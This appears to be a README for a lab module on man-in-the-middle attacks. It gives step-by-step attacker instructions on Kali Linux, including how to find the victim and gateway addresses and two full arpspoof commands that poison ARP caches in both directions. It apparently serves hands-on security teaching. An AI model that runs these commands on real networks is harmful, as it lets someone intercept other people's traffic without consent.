# Man in the Middle Attack Module

This file is a placeholder for this folder.

## Attacker Instructions

More is involved with the attacker in this module so we will start here:

1. Load up the attacker machine which should utilize Kali linux.
2. Open two terminals `Ctrl + [Alt] + t`:
    1. one will be used to communicate with the victim of the attack.
    2. the other will be used to communicate with the device that the victim intended to communicate with (via the router).
3. Find your victim's and the gateway IP addresses:
    1. A simple way to do this is to type `ifconfig` (Linux command)
    on the target machine (or `ipconfig` on a Windows machine).
    2. Another way is to utilize `arp -a` on the attacking machine and if the attack
    is being performed on a small, isolated network, the machine should be easily identified.
    The gateway typically ends in a 1 (Ex. `192.168.1.1`) and the target device will end
    in something larger (Ex. `192.168.1.105`)
4. On the terminal being used to communicate with your target (the victim), type in the command:
`sudo arpspoof -i wlan0 -t [VICTIMS_IP] [GATEWAY_IP]`
5. On the terminal being used to communicate with the gateway (the router), type in the command:
`sudo arpspoof -i wlan0 -t [GATEWAY_IP] [VICTIMS_IP]`
